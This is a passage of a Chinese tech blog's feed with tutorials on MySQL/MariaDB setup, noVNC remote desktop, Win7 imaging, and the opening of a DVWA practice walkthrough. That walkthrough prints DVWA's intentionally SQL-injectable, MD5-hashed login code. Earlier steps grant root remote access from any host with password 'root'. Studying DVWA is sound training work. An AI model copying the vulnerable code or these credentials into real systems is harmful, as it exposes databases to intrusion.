password=password(&#x27;root&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-添加远程登录权限"><a class="markdownIt-Anchor" href="#8-添加远程登录权限">#</a> 8. 添加远程登录权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在mysql中输入</span></span><br><span class="line">grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h3 id="9-将mysql加入service系统服务"><a class="markdownIt-Anchor" href="#9-将mysql加入service系统服务">#</a> 9. 将 MySQL 加入 Service 系统服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp support-files/mysql.server /etc/init.d/mysqld</span><br><span class="line">chkconfig --add mysqld</span><br><span class="line">chkconfig mysqld on</span><br><span class="line">service mysqld restart</span><br><span class="line">service mysqld status</span><br></pre></td></tr></table></figure><h3 id="10-配置mycnf"><a class="markdownIt-Anchor" href="#10-配置mycnf">#</a> 10. 配置 my.cnf</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi my.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash">添加如下语句</span></span><br><span class="line">character-set-server=utf8</span><br><span class="line">lower_case_table_names=1</span><br><span class="line">max_allowed_packet=100M</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">配置完成重启服务</span></span><br><span class="line">service mysqld restart</span><br><span class="line">service mysqld status</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7下yum安装MariaDB</title>
      <link href="/2021/05/20/%E5%B9%B3%E5%8F%B0/Centos7%E4%B8%8Byum%E5%AE%89%E8%A3%85MariaDB/"/>
      <url>/2021/05/20/%E5%B9%B3%E5%8F%B0/Centos7%E4%B8%8Byum%E5%AE%89%E8%A3%85MariaDB/</url>
      
        <content type="html"><![CDATA[<h1 id="centos7下yum安装mariadb"><a class="markdownIt-Anchor" href="#centos7下yum安装mariadb">#</a> centos7 下 yum 安装 MariaDB</h1><p>CentOS 7 下 mysql 下替换成 MariaDB 了。<br>MariaDB 数据库管理系统是 MySQL 的一个分支，主要由开源社区在维护，采用 GPL 授权 许可 MariaDB 的目的是完全兼容 MySQL，包括 API 和命令行，使之能轻松成为 MySQL 的代替品。</p><h2 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line"></span><br><span class="line">systemctl start mariadb   #启动mariadb</span><br><span class="line">systemctl enable mariadb  #设置开机自启动</span><br><span class="line">systemctl stop mariadb    #停止MariaDB</span><br><span class="line">systemctl restart mariadb #重启MariaDB</span><br><span class="line">mysql_secure_installation #设置root密码等相关</span><br><span class="line">mysql -uroot -p           #测试登录   </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改密码</span></span><br><span class="line">update mysql.user set password=PASSWORD(&#x27;123456&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新权限</span></span><br><span class="line">flush privileges; </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建用户</span></span><br><span class="line"><span class="meta">#</span><span class="bash">create user  <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机&#x27;</span> identified by <span class="string">&#x27;密码&#x27;</span>   如果只允许本机访问 @<span class="string">&#x27;localhost&#x27;</span>  , 或者指定一个ip  @<span class="string">&#x27;192.xx.xx.xx&#x27;</span> 或者使用通配: @<span class="string">&#x27;%&#x27;</span></span></span><br><span class="line">create user &#x27;read_visa&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新用户权限</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> grant 操作类型 on 数据库.表 to 用户@<span class="string">&#x27;主机&#x27;</span>   数据库,表,主机都支持通配符 grant select, insert on *.* to  <span class="string">&#x27;read_visa&#x27;</span>@<span class="string">&#x27;%&#x27;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> grant all on visa.* to <span class="string">&#x27;read_visa&#x27;</span>@<span class="string">&#x27;%&#x27;</span>; // all 表示所有权限</span></span><br><span class="line">grant select on visa.* to &#x27;read_visa&#x27;@&#x27;%&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10+noVNC</title>
      <link href="/2021/05/19/%E5%B9%B3%E5%8F%B0/Win10+noVNC/"/>
      <url>/2021/05/19/%E5%B9%B3%E5%8F%B0/Win10+noVNC/</url>
      
        <content type="html"><![CDATA[<h1 id="网页实现远程桌面"><a class="markdownIt-Anchor" href="#网页实现远程桌面">#</a> 网页实现远程桌面</h1><h2 id="环境"><a class="markdownIt-Anchor" href="#环境">#</a> 环境</h2><ul><li>Win10 (被访问的 Server, 设其 IP 为 11.11.11.11)</li></ul><h2 id="软件"><a class="markdownIt-Anchor" href="#软件">#</a> 软件</h2><ul><li>nodejs</li><li>noVnc</li><li>websockify</li><li>tightvnc</li></ul><h2 id="搭建流程"><a class="markdownIt-Anchor" href="#搭建流程">#</a> 搭建流程</h2><ul><li>Server 安装 nodejs</li><li>安装 ws、optimist 模块（执行 websockify.js 文件所需）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install ws</span><br><span class="line">npm install optimist</span><br><span class="line">npm install mime-types</span><br></pre></td></tr></table></figure><ul><li>将 noVNC 解压到 C:\Users\XXX (用户名)\node_modules\ 下</li><li>将 websockify 解压到 C:\Users\XXX (用户名)\node_modules\noVNC 下</li><li>如图</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518103523666.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518103523666"></p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518103547147.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518103547147"></p><ul><li><p>将./noVNC/vnc.html 复制一份，更名为 index.html</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518105649182.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518105649182"></p></li><li><p>Server 安装 tightVNC</p></li><li><p>运行 tightVNC server, 任务栏找到图标<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518103816266.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518103816266"></p></li><li><p>单击打开，设置连接密码</p></li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518104024652.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518104024652"></p><ul><li><p>这里服务默认端口 5900，不用更改</p></li><li><p>打开 cmd，使用 websockify.js 转发 9000 端口的 http 链接到 5900 端口，运行以下命令</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node C:\Users\SSR\node_modules\noVNC\websockify-js-master\websockify\websockify.js --web C:\Users\SSR\node_modules\noVNC 9000 localhost:5900</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意更改用户路径</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意更改localhost为本机IP（11.11.11.11）</span></span><br></pre></td></tr></table></figure><ul><li>保持 cmd 窗口后台运行，打开 Win10 防火墙设置，添加入站规则，允许 TCP9000 端口入站<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518104902295.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518104902295"></li><li>配置完成</li></ul><h2 id="验证效果"><a class="markdownIt-Anchor" href="#验证效果">#</a> 验证效果</h2><ul><li>打开同网段另一台电脑，打开浏览器</li><li>访问 ServerIP:9000，形如 11.11.11.11:9000<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518110422381.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518110422381"></li><li>点击连接，输入之前设置的连接密码<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518110522936.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518110522936"></li><li>成功连接 Win10<br>![](E:\SSR\Pictures\ 屏幕截图 2021-05-18 110948.png)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux+noVNC</title>
      <link href="/2021/05/18/%E5%B9%B3%E5%8F%B0/Linux+noVNC/"/>
      <url>/2021/05/18/%E5%B9%B3%E5%8F%B0/Linux+noVNC/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxnovnc"><a class="markdownIt-Anchor" href="#linuxnovnc">#</a> Linux+noVNC</h1><h2 id="环境及软件"><a class="markdownIt-Anchor" href="#环境及软件">#</a> 环境及软件</h2><ul><li>Centos7 桌面</li><li>noVNC</li><li>websockify</li><li>tigervnc-server</li></ul><h2 id="搭建流程"><a class="markdownIt-Anchor" href="#搭建流程">#</a> 搭建流程</h2><ol><li>安装 Centos7 桌面版</li><li>安装 noVNC<ul><li>git clone <a href="https://github.com/novnc/noVNC">https://github.com/novnc/noVNC</a></li><li>git clone <a href="https://github.com/novnc/websockify">https://github.com/novnc/websockify</a></li><li>mv ./websockify ./noVNC/</li><li>cd ./noVNC/utils/</li><li>openssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem</li><li>生成证书，一直回车</li><li>yum -y install python3</li><li>yum -y install numpy</li><li>缺啥补啥</li></ul></li><li>安装 tigervnc-server<ul><li>yum -y install tigervnc-server</li><li>建立服务</li><li>vncserver :1</li><li>输入连接密码，最低 6 位数</li><li>牢记访问密码</li></ul></li><li>启动服务</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/noVNC/utils/launch.sh --vnc localhost:5901</span><br></pre></td></tr></table></figure><h2 id="测试"><a class="markdownIt-Anchor" href="#测试">#</a> 测试</h2><ol><li>打开另一台同网段电脑浏览器，Chrome/Firefox</li><li>访问 http://CentosIP/vnc.html</li></ol><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518194210406.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518194210406"></p><ol start="3"><li>输入密码</li></ol><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518194236868.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518194236868"></p><ol start="4"><li>网页连接成功</li></ol><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518194333582.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518194333582"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win7系统封装与快速装机</title>
      <link href="/2021/05/03/%E5%B9%B3%E5%8F%B0/Win7%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/"/>
      <url>/2021/05/03/%E5%B9%B3%E5%8F%B0/Win7%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="win7系统封装与快速装机"><a class="markdownIt-Anchor" href="#win7系统封装与快速装机">#</a> Win7 系统封装与快速装机</h1><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cdos.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="dos"></p><h3 id="背景"><a class="markdownIt-Anchor" href="#背景">#</a> 背景</h3><p>最近小编接受了一项任务，给一定数量的电脑更换系统，并且需要根据实际，在系统中安装环境和许多软件，而一台一台安装又不大现实，于是就开始了这一次艰辛的历程，从开始着手到最终成功花费了近一周的空闲时间，失败次数 4 次以上，而每次尝试花费的时间都在 5 小时左右。。。<br>于是特地把过程记录下来，希望能帮到有需要的人，所需要的工具放在最后。</p><h3 id="任务目标"><a class="markdownIt-Anchor" href="#任务目标">#</a> 任务目标</h3><p>给若干电脑装系统，并带有自定义的软件。采取的解决方法是制作自定义的封装系统。</p><h3 id="准备工具"><a class="markdownIt-Anchor" href="#准备工具">#</a> 准备工具</h3><ul><li><p>Win7 镜像</p></li><li><p>虚拟机环境</p></li><li><p>各类软件安装包</p></li><li><p>优化清理工具</p></li><li><p>系统封装工具</p></li><li><p>PE 启动盘一个</p></li></ul><h3 id="安装系统"><a class="markdownIt-Anchor" href="#安装系统">#</a> 安装系统</h3><ul><li>首先在 VMware 中安装 Win7 系统，安装系统步骤省略。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502203925837.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502203925837"></p><ul><li>安装到这个界面时停住，建立一次快照，记得每做完几步就建立快照哦。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502204145183.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502204145183"></p><ul><li>此时注意，第一个关键点，否则将失败，这里不添加用户，按下 Ctrl+Shift+F3，系统重启，自动用 Administrator 登录。出现以下界面。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502204527028.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502204527028"></p><ul><li>此时注意，第二个关键点，这里选择取消，并且以后的每次重启都选择取消。之后改改分辨率，将桌面图标调出来。</li></ul><h3 id="安装所需软件"><a class="markdownIt-Anchor" href="#安装所需软件">#</a> 安装所需软件</h3><ul><li>接下来就是一个接一个地安装软件。U1S1，安装这些软件真太费时间了。</li><li>这里小编安装了一些语言环境和常用的软件，当然也可以结合需要安装不同软件。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502210406879.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt=""></p><h3 id="清理优化"><a class="markdownIt-Anchor" href="#清理优化">#</a> 清理优化</h3><ul><li>安装完所有需要的软件后，接下来将系统清理一下。</li><li>使用 Dism++ 等清理工具将系统运行不需要的功能和缓存清除，修改一些系统设置，清空回收站等，清理完后系统减小了约 10G 的空间。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502205849480.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502205849480"></p><h3 id="封装系统"><a class="markdownIt-Anchor" href="#封装系统">#</a> 封装系统</h3><p>接下来到最关键的步骤了，这一步直接决定成功与否。</p><h4 id="第一次封装"><a class="markdownIt-Anchor" href="#第一次封装">#</a> 第一次封装</h4><ul><li>在做好一切准备工作后，确定这就是你想要的系统时，就可以开始封装系统了。</li><li>使用系统封装工具 EasySysprep5 对系统进行第一次封装，注意这次是在 Win7 系统中进行。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502210924733.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502210924733"></p><ul><li>直接一键封装。封装结束后需要立即进入 PE 系统进行第二次封装。</li></ul><h4 id="第二次封装"><a class="markdownIt-Anchor" href="#第二次封装">#</a> 第二次封装</h4><ul><li><p>关于 VM 中进入 PE 系统，这里有些经验分享给你。</p></li><li><p>第一步，将虚拟机关机，在虚拟机设置中添加硬盘，直到这一步。</p></li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502211314063.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502211314063"></p><ul><li>这里选择使用物理磁盘，选择 PhysicalDrive1，我的情况是电脑只有一块硬盘，那么第二块就是 U 盘了，如果有疑惑可以打开磁盘管理查看，使用整个磁盘，添加完毕。扩展一下，这边也可以使用主机硬盘分区，就类似于共享了主机的一块分区，但是注意不能是系统分区和运行软件的分区。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503125957086.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503125957086"></p><ul><li>开机选择打开电源进入固件，就是进入 BIOS 改变启动顺序，在 BOOT 选项中将第二块硬盘放到最上面，F10 保存重启。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502211610879.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502211610879"></p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130535636.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503130535636"></p><ul><li>进入 PE 后进行第二次封装，一键封装就行，如果没啥问题就成功了。封装完成后别重启，进行下一步系统备份。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130650549.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503130650549"></p><h3 id="制作ghost镜像"><a class="markdownIt-Anchor" href="#制作ghost镜像">#</a> 制作 Ghost 镜像</h3><ul><li>使用 PE 系统的 Ghost 软件进行备份，选择 Win7 系统所在的盘，备份成为.gho 文件。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130903826.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503130903826"></p><ul><li>经过近一小时的等待，备份 40 多 G 的系统，得到了 17G 大小的 GHO 镜像，到这里制作自定义系统就结束了。</li></ul><h3 id="测试效果"><a class="markdownIt-Anchor" href="#测试效果">#</a> 测试效果</h3><ul><li>小编在是直接在原系统上测试，进入 PE 使用分区工具将原系统分区和大约 300M 大小的引导分区格式化，再使用 Ghost 恢复分区，经过一小时的等待，恢复完成。</li><li>这时别着急重启系统，使用 DG 分区工具重建还原后的分区引导，不然可能不能正常开机哦。</li><li>成功启动。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503132307337.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503132307337"></p><ul><li>所有环境都在，软件功能正常。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503132750165.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503132750165"></p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h3><ul><li><p>这件看起来很简单的事，为什么花了这么久的时间？一开始呢，就想着制作 GHO 镜像，然后还原就能用，但是并非如此，其实在 CSDN 上有很成熟的教程，但是之前并不知道 “系统封装” 这个关键词，信息上的缺乏真会延误战机。不过呢，在过程中了解了许多系统相关知识，还在 U 盘里装了个 MSDOS 系统，等等收获也是不少。</p></li><li><p>最后手动 @CSDN 作者 “小鱼儿 yr” 提供的详细教程，如果觉得这篇教程不够详细，可以再看看他的。</p></li><li><p>工具链接：<a href="https://pan.baidu.com/s/1t_X6c1xftADwYN1diiRO1Q">https://pan.baidu.com/s/1t_X6c1xftADwYN1diiRO1Q</a> 提取码：lc7e</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA通关手册</title>
      <link href="/2021/04/15/%E5%AE%89%E5%85%A8/DVWA/"/>
      <url>/2021/04/15/%E5%AE%89%E5%85%A8/DVWA/</url>
      
        <content type="html"><![CDATA[<h1 id="dvwa通关手册"><a class="markdownIt-Anchor" href="#dvwa通关手册">#</a> DVWA 通关手册</h1><h2 id="brute-force"><a class="markdownIt-Anchor" href="#brute-force">#</a> Brute Force</h2><p>登录界面</p><h2 id="image-20210425163130153"><a class="markdownIt-Anchor" href="#image-20210425163130153">#</a> <img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163130153.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425163130153"></h2><h3 id="low"><a class="markdownIt-Anchor" href="#low">#</a> Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li><p>使用 Burp Suit 抓包</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163429574.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" 